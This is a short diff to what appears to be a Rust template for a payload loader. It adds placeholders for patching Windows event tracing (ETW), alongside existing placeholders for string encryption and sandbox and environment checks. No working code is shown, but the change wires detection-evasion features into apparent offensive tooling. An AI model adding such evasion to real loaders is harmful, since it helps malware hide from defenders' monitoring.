@@ -4,6 +4,8 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
+{{ETW_PATCH_FUNCTION}}
+
 use std::ptr::null_mut;
 use std::time::Instant;
 
@@ -80,6 +82,7 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     {{SANDBOX}}
+    {{ETW_PATCH_CALL}}
 
     if !check_environment() { return; }
 
